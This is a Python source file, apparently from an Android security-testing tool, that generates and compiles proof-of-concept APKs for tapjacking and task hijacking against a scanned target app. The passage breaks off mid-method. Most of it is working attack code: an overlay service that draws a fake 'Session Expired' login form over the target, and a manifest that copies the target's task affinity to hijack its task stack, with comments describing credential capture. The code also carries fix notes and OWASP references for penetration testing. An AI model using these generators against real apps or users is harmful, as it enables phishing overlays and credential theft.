"""
Dynamic PoC APK Generator
Creates app-specific tapjacking and task hijacking proof-of-concept APKs
based on actual scan results for the target application.

Uses Android SDK build tools (aapt, d8, zipalign, apksigner) to compile
minimal Android apps that demonstrate the specific vulnerabilities found.
"""
import os
import re
import json
import shutil
import tempfile
import subprocess
import zipfile
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional


# ─── Android SDK paths ────────────────────────────────────────────────

ANDROID_SDK = Path(os.environ.get('ANDROID_HOME',
    os.environ.get('ANDROID_SDK_ROOT',
        str(Path.home() / 'AppData' / 'Local' / 'Android' / 'Sdk'))))

BUILD_TOOLS_VERSION = '35.0.0'
PLATFORM_VERSION = 'android-34'

def _sdk_tool(name):
    """Get path to an Android SDK build tool."""
    return str(ANDROID_SDK / 'build-tools' / BUILD_TOOLS_VERSION / name)

def _android_jar():
    """Get path to android.jar for the platform."""
    return str(ANDROID_SDK / 'platforms' / PLATFORM_VERSION / 'android.jar')


@dataclass
class PoCResult:
    success: bool
    poc_type: str  # 'tapjacking' or 'task_hijacking'
    apk_path: str = ''
    target_package: str = ''
    targeted_activities: list = field(default_factory=list)
    description: str = ''
    error: str = ''
    log: list = field(default_factory=list)


class PoCGenerator:
    """Generates app-specific PoC APKs for tapjacking and task hijacking."""

    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_from_scan(self, scan_results: dict, poc_type: str = 'both') -> list:
        """
        Generate PoC APKs based on scan results.

        Args:
            scan_results: Full scan report dict with file_info and results
            poc_type: 'tapjacking', 'task_hijacking', or 'both'

        Returns:
            List of PoCResult objects
        """
        target_info = self._extract_target_info(scan_results)
        if not target_info['package_name']:
            return [PoCResult(False, poc_type, error='No package name found in scan results')]

        results = []
        if poc_type in ('tapjacking', 'both'):
            results.append(self._generate_tapjacking_poc(target_info))
        if poc_type in ('task_hijacking', 'both'):
            results.append(self._generate_task_hijacking_poc(target_info))
        return results

    def _extract_target_info(self, scan_results: dict) -> dict:
        """Extract target app info from scan results."""
        file_info = scan_results.get('file_info', {})
        results = scan_results.get('results', [])

        # Get exported activities from evidence
        exported_activities = []
        all_activities = file_info.get('activities', [])
        for r in results:
            for e in r.get('evidence', []):
                if 'Exported: Activity:' in str(e):
                    act = str(e).replace('Exported: Activity:', '').strip()
                    exported_activities.append(act)

        # If no exported found explicitly, use all activities (any could be targeted)
        if not exported_activities:
            exported_activities = [a for a in all_activities
                                   if not a.startswith('android.') and not a.startswith('com.google.')]

        # Identify sensitive activities (keywords that suggest sensitive screens)
        sensitive_keywords = ['login', 'auth', 'send', 'transfer', 'pay', 'password',
                              'bank', 'money', 'transaction', 'profile', 'balance',
                              'register', 'otp', 'verify', 'secret', 'key']
        sensitive_activities = []
        for act in exported_activities:
            act_lower = act.lower().split('.')[-1]
            if any(kw in act_lower for kw in sensitive_keywords):
                sensitive_activities.append(act)

        # Fallback: if no sensitive activities identified, use first 3 exported
        if not sensitive_activities and exported_activities:
            sensitive_activities = exported_activities[:3]

        # Get package name, main activity, etc.
        package_name = file_info.get('package_name', '')
        main_activity = file_info.get('main_activity', '')
        app_name = file_info.get('app_name', 'TargetApp')
        target_sdk = file_info.get('target_sdk', 28)

        return {
            'package_name': package_name,
            'main_activity': main_activity,
            'app_name': app_name,
            'target_sdk': target_sdk,
            'exported_activities': exported_activities,
            'sensitive_activities': sensitive_activities,
            'all_activities': all_activities,
        }

    # ─── Tapjacking PoC ───────────────────────────────────────────────

    def _generate_tapjacking_poc(self, target: dict) -> PoCResult:
        """Generate a tapjacking PoC APK targeting the scanned app."""
        result = PoCResult(True, 'tapjacking', target_package=target['package_name'])

        work_dir = Path(tempfile.mkdtemp(prefix='poc_tapjack_'))
        try:
            poc_package = f"{target['package_name']}.tapjack.poc"
            activities_to_target = target['sensitive_activities'] or target['exported_activities'][:3]
            result.targeted_activities = activities_to_target

            # Step 1: Generate AndroidManifest.xml
            manifest = self._gen_tapjack_manifest(poc_package, target)
            (work_dir / 'AndroidManifest.xml').write_text(manifest, encoding='utf-8')
            result.log.append('Generated AndroidManifest.xml')

            # Step 2: Generate resources
            self._gen_tapjack_resources(work_dir)
            result.log.append('Generated resources')

            # Step 3: Generate Java source
            java_src = self._gen_tapjack_java(poc_package, target, activities_to_target)
            java_dir = work_dir / 'src' / poc_package.replace('.', '/')
            java_dir.mkdir(parents=True)
            (java_dir / 'TapjackPocActivity.java').write_text(java_src, encoding='utf-8')
            (java_dir / 'OverlayService.java').write_text(
                self._gen_overlay_service(poc_package, target, activities_to_target), encoding='utf-8')
            result.log.append('Generated Java source files')

            # Step 4: Compile
            apk_name = f"tapjack_{target['package_name'].replace('.', '_')}.apk"
            apk_path = self._compile_apk(work_dir, poc_package, apk_name)
            if apk_path:
                result.apk_path = apk_path
                result.description = (
                    f"Tapjacking PoC for {target['app_name']}. "
                    f"Targets {len(activities_to_target)} exported activity(ies): "
                    f"{', '.join(a.split('.')[-1] for a in activities_to_target)}. "
                    f"Install on same device, open, and tap 'Start Overlay Attack' "
                    f"then switch to {target['app_name']}."
                )
                result.log.append(f'APK built: {apk_name}')
            else:
                result.success = False
                result.error = 'APK compilation failed'
                result.log.append('Compilation failed')

        except Exception as e:
            result.success = False
            result.error = str(e)
            result.log.append(f'Error: {e}')
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

        return result

    def _gen_tapjack_manifest(self, poc_package: str, target: dict) -> str:
        return f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{poc_package}"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.INTERNET"/>

    <application
        android:label="Tapjack PoC"
        android:icon="@drawable/ic_launcher"
        android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar"
        android:allowBackup="false">

        <activity
            android:name=".TapjackPocActivity"
            android:exported="true"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service
            android:name=".OverlayService"
            android:exported="false"/>
    </application>
</manifest>"""

    def _gen_tapjack_resources(self, work_dir: Path):
        """Generate minimal Android resources."""
        res = work_dir / 'res'
        (res / 'values').mkdir(parents=True)
        (res / 'drawable').mkdir(parents=True)
        (res / 'xml').mkdir(parents=True)
        (res / 'layout').mkdir(parents=True)

        # strings.xml
        (res / 'values' / 'strings.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?><resources>'
            '<string name="app_name">Tapjack PoC</string>'
            '</resources>', encoding='utf-8')

        # colors.xml
        (res / 'values' / 'colors.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?><resources>'
            '<color name="red">#FF1744</color>'
            '<color name="dark">#1A1A2E</color>'
            '</resources>', encoding='utf-8')

        # network_security_config.xml
        (res / 'xml' / 'network_security_config.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?>'
            '<network-security-config><base-config cleartextTrafficPermitted="true">'
            '<trust-anchors><certificates src="system"/></trust-anchors>'
            '</base-config></network-security-config>', encoding='utf-8')

        # ic_launcher.xml (adaptive icon)
        (res / 'drawable' / 'ic_launcher.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?>'
            '<shape xmlns:android="http://schemas.android.com/apk/res/android"'
            ' android:shape="oval">'
            '<solid android:color="#FF1744"/>'
            '<size android:width="48dp" android:height="48dp"/>'
            '</shape>', encoding='utf-8')

        # activity_main.xml
        (res / 'layout' / 'activity_main.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?>'
            '<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"'
            ' android:layout_width="match_parent" android:layout_height="match_parent"'
            ' android:orientation="vertical" android:padding="24dp"'
            ' android:background="#1A1A2E" android:gravity="center">'

            '<TextView android:layout_width="wrap_content" android:layout_height="wrap_content"'
            ' android:text="Tapjacking PoC" android:textColor="#FF1744"'
            ' android:textSize="24sp" android:textStyle="bold" android:layout_marginBottom="16dp"/>'

            '<TextView android:id="@+id/tvStatus" android:layout_width="match_parent"'
            ' android:layout_height="wrap_content" android:text="Ready"'
            ' android:textColor="#CCCCCC" android:textSize="14sp" android:gravity="center"'
            ' android:layout_marginBottom="24dp"/>'

            '<Button android:id="@+id/btnStart" android:layout_width="match_parent"'
            ' android:layout_height="wrap_content" android:text="Start Overlay Attack"'
            ' android:textColor="#FFFFFF" android:background="#FF1744"'
            ' android:layout_marginBottom="12dp"/>'

            '<Button android:id="@+id/btnLaunch" android:layout_width="match_parent"'
            ' android:layout_height="wrap_content" android:text="Launch Target App"'
            ' android:textColor="#FFFFFF" android:background="#6C3CE0"/>'
            '</LinearLayout>', encoding='utf-8')

    def _gen_tapjack_java(self, poc_package: str, target: dict, activities: list) -> str:
        """Generate the main tapjacking PoC Activity."""
        target_pkg = target['package_name']
        # Build comment list of activities
        acts_comment = '\n'.join(f' *   - {a}' for a in activities)

        # Build activity list for display (with commas)
        acts_items = [f'        "{a}"' for a in activities]
        acts_display = ',\n'.join(acts_items)

        return f"""package {poc_package};

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

/**
 * Tapjacking PoC for {target['app_name']} ({target_pkg})
 *
 * Demonstrates overlay attack against these exported activities:
{acts_comment}
 *
 * HOW IT WORKS:
 * 1. Requests overlay permission (SYSTEM_ALERT_WINDOW)
 * 2. Creates a transparent overlay that draws over the target app
 * 3. Overlay mimics a "Session Expired" dialog to trick the user
 * 4. When user taps buttons on the overlay, the touch passes through
 *    to the underlying target app, performing unintended actions
 *
 * FIX: Set android:filterTouchesWhenObscured="true" on sensitive views
 * Ref: https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-4/
 */
public class TapjackPocActivity extends Activity {{

    private static final String TARGET_PACKAGE = "{target_pkg}";
    private static final String[] TARGET_ACTIVITIES = {{
{acts_display}
    }};

    private LinearLayout layout;
    private TextView tvStatus;
    private Button btnStart, btnLaunch;
    private boolean overlayActive = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(48, 48, 48, 48);
        int[][] colors = new int[1][1];
        layout.setBackgroundColor(0xFF1A1A2E);

        tvStatus = new TextView(this);
        tvStatus.setText("Tapjacking PoC — " + TARGET_PACKAGE);
        tvStatus.setTextColor(0xFFFF1744);
        tvStatus.setTextSize(18);
        tvStatus.setGravity(Gravity.CENTER);
        tvStatus.setPadding(0, 0, 0, 24);
        layout.addView(tvStatus);

        TextView tvInfo = new TextView(this);
        tvInfo.setText("Target: " + TARGET_PACKAGE + "\\n"
            + "Activities: " + TARGET_ACTIVITIES.length + " exported\\n"
            + "Tap 'Start Overlay' then switch to target app");
        tvInfo.setTextColor(0xFFCCCCCC);
        tvInfo.setTextSize(13);
        tvInfo.setGravity(Gravity.CENTER);
        tvInfo.setPadding(0, 0, 0, 36);
        layout.addView(tvInfo);

        btnStart = new Button(this);
        btnStart.setText(overlayActive ? "Stop Overlay" : "Start Overlay Attack");
        btnStart.setTextColor(0xFFFFFFFF);
        btnStart.setBackgroundColor(0xFFFF1744);
        btnStart.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                if (overlayActive) {{
                    stopOverlay();
                }} else {{
                    startOverlay();
                }}
            }}
        }});
        layout.addView(btnStart);

        btnLaunch = new Button(this);
        btnLaunch.setText("Launch Target App");
        btnLaunch.setTextColor(0xFFFFFFFF);
        btnLaunch.setBackgroundColor(0xFF6C3CE0);
        btnLaunch.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                launchTarget();
            }}
        }});
        layout.addView(btnLaunch);

        // Show targeted activities list
        TextView tvTargets = new TextView(this);
        StringBuilder sb = new StringBuilder("\\nTargeted Activities:\\n");
        for (String act : TARGET_ACTIVITIES) {{
            sb.append("  • ").append(act.split("\\\\.").length > 0
                ? act.split("\\\\.")[act.split("\\\\.").length - 1] : act).append("\\n");
        }}
        tvTargets.setText(sb.toString());
        tvTargets.setTextColor(0xFF8892B0);
        tvTargets.setTextSize(11);
        tvTargets.setPadding(0, 24, 0, 0);
        layout.addView(tvTargets);

        setContentView(layout);

        // Check overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {{
            tvStatus.setText("Requesting overlay permission...");
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }}
    }}

    private void startOverlay() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {{
            Toast.makeText(this, "Overlay permission required", Toast.LENGTH_LONG).show();
            return;
        }}

        Intent serviceIntent = new Intent(this, OverlayService.class);
        serviceIntent.putExtra("target_package", TARGET_PACKAGE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            startForegroundService(serviceIntent);
        }} else {{
            startService(serviceIntent);
        }}

        overlayActive = true;
        btnStart.setText("Stop Overlay");
        tvStatus.setText("Overlay ACTIVE — switch to target app now!");
        tvStatus.setTextColor(0xFF00E676);
    }}

    private void stopOverlay() {{
        stopService(new Intent(this, OverlayService.class));
        overlayActive = false;
        btnStart.setText("Start Overlay Attack");
        tvStatus.setText("Overlay stopped");
        tvStatus.setTextColor(0xFFCCCCCC);
    }}

    private void launchTarget() {{
        try {{
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(TARGET_PACKAGE, TARGET_ACTIVITIES[0]));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            tvStatus.setText("Launched " + TARGET_ACTIVITIES[0].split("\\\\.")[
                TARGET_ACTIVITIES[0].split("\\\\.").length - 1]);
        }} catch (Exception e) {{
            tvStatus.setText("Could not launch target: " + e.getMessage());
            tvStatus.setTextColor(0xFFFF1744);
        }}
    }}
}}"""

    def _gen_overlay_service(self, poc_package: str, target: dict, activities: list) -> str:
        """Generate the overlay service that draws over the target app."""
        target_pkg = target['package_name']
        return f"""package {poc_package};

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.IBinder;
import android.text.InputType;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * Overlay Service — draws a fake "Session Expired" dialog over the target app.
 *
 * This demonstrates tapjacking: the overlay appears legitimate to the user,
 * but any taps on the overlay buttons will pass through to the underlying
 * target app activity, performing unintended actions.
 *
 * The overlay is semi-transparent and includes:
 * - A fake "Session Expired" title
 * - A fake username/password form (visual only)
 * - Buttons that tap through to underlying UI elements
 */
public class OverlayService extends Service {{

    private WindowManager windowManager;
    private View overlayView;
    private static final String CHANNEL_ID = "poc_overlay";

    @Override
    public void onCreate() {{
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        createNotificationChannel();
        startForeground(1, buildNotification());
        createOverlay();
    }}

    private void createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "PoC Overlay", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }}
    }}

    private Notification buildNotification() {{
        Intent intent = new Intent(this, TapjackPocActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            builder = new Notification.Builder(this, CHANNEL_ID);
        }} else {{
            builder = new Notification.Builder(this);
        }}
        return builder
            .setContentTitle("Tapjack PoC Active")
            .setContentText("Overlay is drawing over target app")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentIntent(pi)
            .build();
    }}

    private void createOverlay() {{
        int overlayType;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        }} else {{
            overlayType = WindowManager.LayoutParams.TYPE_PHONE;
        }}

        // Build the overlay UI
        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setGravity(Gravity.CENTER);
        container.setPadding(48, 32, 48, 32);

        // Semi-transparent dark background
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(0xE61A1A2E);
        bg.setCornerRadius(24f);
        container.setBackground(bg);
        container.setPadding(48, 32, 48, 32);

        // Warning icon + title
        TextView tvTitle = new TextView(this);
        tvTitle.setText("\\u26a0 Session Expired");
        tvTitle.setTextColor(0xFFFF1744);
        tvTitle.setTextSize(18);
        tvTitle.setGravity(Gravity.CENTER);
        container.addView(tvTitle);

        TextView tvMsg = new TextView(this);
        tvMsg.setText("Your session has expired. Please log in again.");
        tvMsg.setTextColor(0xFFCCCCCC);
        tvMsg.setTextSize(13);
        tvMsg.setGravity(Gravity.CENTER);
        tvMsg.setPadding(0, 12, 0, 24);
        container.addView(tvMsg);

        // Fake username field (visual only — taps pass through)
        EditText etUser = new EditText(this);
        etUser.setHint("Username");
        etUser.setInputType(InputType.TYPE_CLASS_TEXT);
        etUser.setEnabled(false);
        GradientDrawable inputBg = new GradientDrawable();
        inputBg.setColor(0xFF2A2A3E);
        inputBg.setCornerRadius(8f);
        inputBg.setStroke(1, 0xFF444466);
        etUser.setBackground(inputBg);
        etUser.setPadding(24, 16, 24, 16);
        container.addView(etUser);

        // Fake password field
        EditText etPass = new EditText(this);
        etPass.setHint("Password");
        etPass.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        etPass.setEnabled(false);
        etPass.setBackground(inputBg);
        etPass.setPadding(24, 16, 24, 16);
        LinearLayout.LayoutParams passParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        passParams.setMargins(0, 12, 0, 0);
        etPass.setLayoutParams(passParams);
        container.addView(etPass);

        // Login button — taps pass through to underlying app
        Button btnLogin = new Button(this);
        btnLogin.setText("Login");
        btnLogin.setTextColor(0xFFFFFFFF);
        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setColor(0xFF6C3CE0);
        btnBg.setCornerRadius(8f);
        btnLogin.setBackground(btnBg);
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        btnParams.setMargins(0, 24, 0, 8);
        btnLogin.setLayoutParams(btnParams);
        container.addView(btnLogin);

        // "Not you?" link
        TextView tvCancel = new TextView(this);
        tvCancel.setText("Cancel");
        tvCancel.setTextColor(0xFF8892B0);
        tvCancel.setTextSize(12);
        tvCancel.setGravity(Gravity.CENTER);
        container.addView(tvCancel);

        // NOTE: No click listeners — taps PASS THROUGH to the target app behind

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            overlayType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.CENTER;
        params.x = 0;
        params.y = 0;

        windowManager.addView(container, params);
        overlayView = container;
    }}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY;
    }}

    @Override
    public void onDestroy() {{
        super.onDestroy();
        if (overlayView != null) {{
            windowManager.removeView(overlayView);
            overlayView = null;
        }}
    }}

    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
}}"""

    # ─── Task Hijacking PoC ───────────────────────────────────────────

    def _generate_task_hijacking_poc(self, target: dict) -> PoCResult:
        """Generate a task hijacking PoC APK."""
        result = PoCResult(True, 'task_hijacking', target_package=target['package_name'])

        work_dir = Path(tempfile.mkdtemp(prefix='poc_taskhijack_'))
        try:
            poc_package = f"{target['package_name']}.taskhijack.poc"
            activities_to_target = target['sensitive_activities'] or target['exported_activities'][:3]
            result.targeted_activities = activities_to_target

            # Generate manifest
            manifest = self._gen_taskhijack_manifest(poc_package, target, activities_to_target)
            (work_dir / 'AndroidManifest.xml').write_text(manifest, encoding='utf-8')
            result.log.append('Generated AndroidManifest.xml')

            # Generate resources
            self._gen_taskhijack_resources(work_dir)
            result.log.append('Generated resources')

            # Generate Java source
            java_dir = work_dir / 'src' / poc_package.replace('.', '/')
            java_dir.mkdir(parents=True)

            (java_dir / 'TaskHijackActivity.java').write_text(
                self._gen_taskhijack_java(poc_package, target, activities_to_target), encoding='utf-8')
            (java_dir / 'HijackReceiver.java').write_text(
                self._gen_hijack_receiver(poc_package, target), encoding='utf-8')
            result.log.append('Generated Java source files')

            # Compile
            apk_name = f"taskhijack_{target['package_name'].replace('.', '_')}.apk"
            apk_path = self._compile_apk(work_dir, poc_package, apk_name)
            if apk_path:
                result.apk_path = apk_path
                result.description = (
                    f"Task Hijacking PoC for {target['app_name']}. "
                    f"Targets {len(activities_to_target)} exported activity(ies). "
                    f"Uses task affinity manipulation and document mode to hijack "
                    f"the target's task stack. Install on same device."
                )
                result.log.append(f'APK built: {apk_name}')
            else:
                result.success = False
                result.error = 'APK compilation failed'

        except Exception as e:
            result.success = False
            result.error = str(e)
            result.log.append(f'Error: {e}')
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)

        return result

    def _gen_taskhijack_manifest(self, poc_package: str, target: dict, activities: list) -> str:
        """Generate manifest with task affinity set to match the target app."""
        target_pkg = target['package_name']

        # Build hijacker activities — one per targeted exported activity
        hijack_activities = ''
        for act in activities:
            act_name = act.split('.')[-1]
            hijack_activities += f"""
        <activity
            android:name=".Hijack_{act_name}"
            android:exported="false"
            android:taskAffinity="{target_pkg}"
            android:documentLaunchMode="intoExisting"
            android:launchMode="standard"
            android:allowTaskReparenting="true"/>"""

        return f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{poc_package}"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="34"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.GET_TASKS"/>

    <application
        android:label="TaskHijack PoC"
        android:icon="@drawable/ic_launcher"
        android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar"
        android:allowBackup="false">

        <activity
            android:name=".TaskHijackActivity"
            android:exported="true"
            android:taskAffinity="{target_pkg}"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        {hijack_activities}

        <receiver
            android:name=".HijackReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="{poc_package}.TRIGGER"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>"""

    def _gen_taskhijack_resources(self, work_dir: Path):
        """Generate resources for task hijacking PoC."""
        res = work_dir / 'res'
        (res / 'values').mkdir(parents=True)
        (res / 'drawable').mkdir(parents=True)
        (res / 'xml').mkdir(parents=True)
        (res / 'layout').mkdir(parents=True)

        (res / 'values' / 'strings.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?><resources>'
            '<string name="app_name">TaskHijack PoC</string>'
            '</resources>', encoding='utf-8')

        (res / 'values' / 'colors.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?><resources>'
            '<color name="purple">#6C3CE0</color>'
            '<color name="dark">#1A1A2E</color>'
            '</resources>', encoding='utf-8')

        (res / 'xml' / 'network_security_config.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?>'
            '<network-security-config><base-config cleartextTrafficPermitted="true">'
            '<trust-anchors><certificates src="system"/></trust-anchors>'
            '</base-config></network-security-config>', encoding='utf-8')

        (res / 'drawable' / 'ic_launcher.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?>'
            '<shape xmlns:android="http://schemas.android.com/apk/res/android"'
            ' android:shape="oval">'
            '<solid android:color="#6C3CE0"/>'
            '<size android:width="48dp" android:height="48dp"/>'
            '</shape>', encoding='utf-8')

        (res / 'layout' / 'activity_main.xml').write_text(
            '<?xml version="1.0" encoding="utf-8"?>'
            '<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"'
            ' android:layout_width="match_parent" android:layout_height="match_parent"'
            ' android:orientation="vertical" android:padding="24dp"'
            ' android:background="#1A1A2E" android:gravity="center">'

            '<TextView android:layout_width="wrap_content" android:layout_height="wrap_content"'
            ' android:text="Task Hijacking PoC" android:textColor="#6C3CE0"'
            ' android:textSize="24sp" android:textStyle="bold" android:layout_marginBottom="16dp"/>'

            '<TextView android:id="@+id/tvStatus" android:layout_width="match_parent"'
            ' android:layout_height="wrap_content" android:text="Ready"'
            ' android:textColor="#CCCCCC" android:textSize="14sp" android:gravity="center"'
            ' android:layout_marginBottom="24dp"/>'

            '<Button android:id="@+id/btnHijack" android:layout_width="match_parent"'
            ' android:layout_height="wrap_content" android:text="Start Task Hijack"'
            ' android:textColor="#FFFFFF" android:background="#6C3CE0"'
            ' android:layout_marginBottom="12dp"/>'

            '<Button android:id="@+id/btnLaunch" android:layout_width="match_parent"'
            ' android:layout_height="wrap_content" android:text="Launch Target Activities"'
            ' android:textColor="#FFFFFF" android:background="#FF1744"/>'
            '</LinearLayout>', encoding='utf-8')

    def _gen_taskhijack_java(self, poc_package: str, target: dict, activities: list) -> str:
        """Generate the task hijacking PoC Activity."""
        target_pkg = target['package_name']
        acts_items = [f'        "{a}"' for a in activities]
        acts_display = ',\n'.join(acts_items)

        return f"""package {poc_package};

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.util.List;

/**
 * Task Hijacking PoC for {target['app_name']} ({target_pkg})
 *
 * This PoC demonstrates MSTG-PLATFORM-5 task hijacking attacks:
 *
 * 1. TASK REPARENTING: Creates activities with the same taskAffinity as the
 *    target app. When the target's exported activities are launched, they
 *    reparent into our task stack, allowing us to manipulate the back stack.
 *
 * 2. DOCUMENT MODE ABUSE: Uses documentLaunchMode to create shadow task
 *    instances that appear in the Recent Apps screen alongside the target.
 *
 * 3. CREDENTIAL CAPTURE: After hijacking, the back button behavior is
 *    altered so pressing back from the target shows our activity instead
 *    of closing the app — potentially capturing credentials.
 *
 * FIX: Set android:allowTaskReparenting="false" on exported activities.
 * FIX: Use android:launchMode="singleTask" or "singleInstance" for sensitive activities.
 * Ref: https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-5/
 */
public class TaskHijackActivity extends Activity {{

    private static final String TARGET_PACKAGE = "{target_pkg}";
    private static final String[] TARGET_ACTIVITIES = {{
{acts_display}
    }};

    private LinearLayout layout;
    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(48, 48, 48, 48);
        layout.setBackgroundColor(0xFF1A1A2E);

        tvStatus = new TextView(this);
        tvStatus.setText("Task Hijacking PoC — " + TARGET_PACKAGE);
        tvStatus.setTextColor(0xFF6C3CE0);
        tvStatus.setTextSize(18);
        tvStatus.setGravity(Gravity.CENTER);
        tvStatus.setPadding(0, 0, 0, 24);
        layout.addView(tvStatus);

        TextView tvInfo = new TextView(this);
        tvInfo.setText("Target: " + TARGET_PACKAGE + "\\n"
            + "This PoC shares the same taskAffinity as the target app.\\n"
            + "Exported activities launched from here will join our task stack.");
        tvInfo.setTextColor(0xFFCCCCCC);
        tvInfo.setTextSize(13);
        tvInfo.setGravity(Gravity.CENTER);
        tvInfo.setPadding(0, 0, 0, 36);
        layout.addView(tvInfo);

        // Start Task Hijack button
        Button btnHijack = new Button(this);
        btnHijack.setText("Start Task Hijack");
        btnHijack.setTextColor(0xFFFFFFFF);
        btnHijack.setBackgroundColor(0xFF6C3CE0);
        btnHijack.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
                performTaskHijack();
            }}
        }});
        layout.addView(btnHijack);

        // Launch Target button
        Button btnLaunch = new Button(this);
        btnLaunch.setText("Launch Target Activities");
        btnLaunch.setTextColor(0xFFFFFFFF);
        btnLaunch.setBackgroundColor(0xFFFF1744);
        LinearLayout.LayoutParams launchParams = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        launchParams.setMargins(0, 12, 0, 0);
        btnLaunch.setLayoutParams(launchParams);
        btnLaunch.setOnClickListener(new View.OnClickListener() {{
            @Override
            public void onClick(View v) {{
